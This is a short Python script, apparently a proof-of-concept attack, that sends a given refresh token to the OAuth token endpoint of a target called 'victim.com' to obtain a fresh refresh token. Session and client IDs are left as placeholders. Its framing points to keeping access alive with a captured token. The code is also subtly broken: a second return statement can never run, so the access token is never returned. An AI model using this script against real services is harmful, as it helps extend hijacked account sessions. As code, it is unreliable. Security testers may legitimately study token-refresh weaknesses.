import requests
import json
import sys

def send_refresh_request(refresh_token):
    url = "https://victim.com/oauth/token"
    headers = {
        "Content-Type": "application/json",
        "Host": "victim.com",
        # Include other headers as needed
    }

    payload = {
        "redirect_uri": "https://victim.com/oauth/callback/",
        "initial_scope": "openid profile email offline_access ID_TYPE:ID_HERE",
        "SessionId": "INSERT_SESSION_ID",
        "identity_sdk_version": "6.40.0",
        "refresh_href": "https://use.victim.com/",
        "client_id": "INSERT_CLIENT_ID",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))

    if response.status_code == 200:
        data = response.json()
        return data.get("refresh_token")
        return data.get("access_token")
    else:
        print(f"Request failed with status code: {response.status_code}")
        print(response.text)
        return None
        


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <initial_refresh_token>")
    else:
        initial_refresh_token = sys.argv[1]
        new_refresh_token = send_refresh_request(initial_refresh_token)
       # if new_refresh_token:
            # Further handling or saving of the new refresh token can be done here
